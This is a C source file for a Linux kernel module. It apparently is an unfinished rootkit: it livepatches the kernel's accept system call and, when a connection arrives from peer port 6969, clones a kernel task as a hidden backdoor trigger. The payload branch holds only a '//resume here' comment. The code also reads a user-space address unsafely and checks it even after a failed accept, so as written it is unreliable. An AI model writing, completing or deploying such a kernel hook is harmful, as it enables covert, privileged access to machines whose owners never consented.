#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/socket.h>
#include <linux/file.h>
#include <linux/livepatch.h>
#include <uapi/linux/in.h>
#include <linux/sched/task.h>
#include <linux/fdtable.h>

#include "include/fakekallsyms.h"

int (*__sys_accept4_file_fp)(struct file *, unsigned, struct sockaddr __user *, int __user *, int, unsigned long);
pid_t (*kernel_clone_fp)(struct kernel_clone_args *);

int __sys_accept4_2(int fd, struct sockaddr __user *upeer_sockaddr, int __user *upeer_addrlen, int flags)
{
	int ret = -EBADF;
	struct fd f;
	struct sockaddr_in *addr_in;
	struct kernel_clone_args args = { .exit_signal = 0x11 };
	
	f = fdget(fd);
	if(f.file) {
		ret = __sys_accept4_file_fp(f.file, 0, upeer_sockaddr, upeer_addrlen, flags, rlimit(RLIMIT_NOFILE));
		fdput(f);	
	}

	addr_in = (struct sockaddr_in *)upeer_sockaddr;
	if(ntohs(addr_in->sin_port) == 6969) {
		if(kernel_clone_fp(&args) == 0) {
			//resume here
		} else {
			close_fd(ret);
			return -1;	
		}
	} 

	return ret;	
}

struct klp_func funcs[] = {
	{ 
		.old_name = "__sys_accept4",
		.new_func = __sys_accept4_2
	}, {}
};

struct klp_object objs[]= {	
	{
		.funcs = funcs
	}, {}
};

struct klp_patch patch = {
	.mod = THIS_MODULE,
	.objs = objs
};

int init_module(void)
{
	const char *symbol = "__sys_accept4_file";
	const char *symbol2 = "kernel_clone";

	__sys_accept4_file_fp = (void *)kallsyms_lookup_name(symbol);
	kernel_clone_fp = (void *)kallsyms_lookup_name(symbol2);

	if(__sys_accept4_file_fp && kernel_clone_fp) {
		klp_enable_patch(&patch);	
	} 

	return 0;
}

void exit_module(void) {}

MODULE_LICENSE("GPL");
MODULE_INFO(livepatch, "Y");
